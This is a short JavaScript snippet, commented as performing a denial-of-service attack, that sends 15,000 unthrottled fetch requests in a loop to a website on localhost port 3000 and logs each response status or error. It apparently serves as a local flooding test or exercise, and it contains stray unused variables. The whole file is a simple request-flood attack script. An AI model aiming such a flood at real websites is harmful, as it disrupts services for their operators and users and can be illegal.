// perform dos attack on website on port 3000

Flag = true;
for (let i = 0; i < 15000; i++){
    let timer = Date.now();
    fetch('http://localhost:3000/website').then(res => console.log(res.status)).catch(err => {
        console.log(err);
    });
}